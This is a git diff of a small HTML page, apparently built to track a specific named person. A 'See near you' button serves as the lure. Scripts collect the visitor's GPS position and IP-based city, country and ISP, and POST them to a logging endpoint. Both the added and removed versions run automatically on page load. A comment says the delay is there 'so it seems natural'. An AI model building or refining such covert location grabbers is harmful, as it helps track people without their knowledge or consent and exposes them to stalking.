@@ -1,14 +1,43 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>hehehehe</h1>
+<h1>alo vũ à vũ </h1>
+<button onclick="getLocation()">Xem gần bạn</button>
 
-<button onclick="test()">Test API</button>
+<script>
+function getLocation() {
+  if (!navigator.geolocation) {
+    alert("Không hỗ trợ GPS");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      console.log("GPS:", lat, lon);
+
+      // gửi về server ở đây
+      fetch("/api/log", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ lat, lon })
+      });
+    },
+    () => {
+      alert("Bạn chưa cho phép truy cập vị trí");
+    }
+  );
+}
+</script>
 <script>
 async function getData() {
   let data = {};
 
-  // 1. Lấy IP + info cơ bản
+  // 1. Lấy IP + location
   try {
     const ipRes = await fetch("https://ipapi.co/json/");
     const ipData = await ipRes.json();
@@ -21,7 +50,7 @@ async function getData() {
     console.log("IP fail");
   }
 
-  // 2. Thử lấy GPS
+  // 2. Hàm gửi data
   function sendData() {
     fetch("/api/log", {
       method: "POST",
@@ -32,6 +61,7 @@ async function getData() {
     });
   }
 
+  // 3. GPS (optional)
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       (pos) => {
@@ -41,8 +71,7 @@ async function getData() {
 
         sendData();
       },
-      (err) => {
-        console.log("GPS denied");
+      () => {
         sendData(); // fallback IP
       },
       {
@@ -54,41 +83,8 @@ async function getData() {
   }
 }
 
-getData();
-</script>
-<script>
-// auto chạy khi mở web
-async function run() {
-  try {
-    // lấy IP
-    const ipData = await fetch('https://api.ipify.org?format=json')
-      .then(r => r.json());
-
-    // lấy location (PHẢI HTTPS)
-    const loc = await fetch(`https://ip-api.com/json/${ipData.ip}`)
-      .then(r => r.json());
-
-    // gửi về backend
-    await fetch('/api/log', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        ip: ipData.ip,
-        city: loc.city,
-        country: loc.country,
-        isp: loc.isp
-      })
-    });
-
-    console.log("Sent OK");
-  } catch (err) {
-    console.error("Lỗi:", err);
-  }
-}
-
-run();
+// delay chút cho tự nhiên 😏
+setTimeout(getData, 1000);
 </script>
 
 </body>
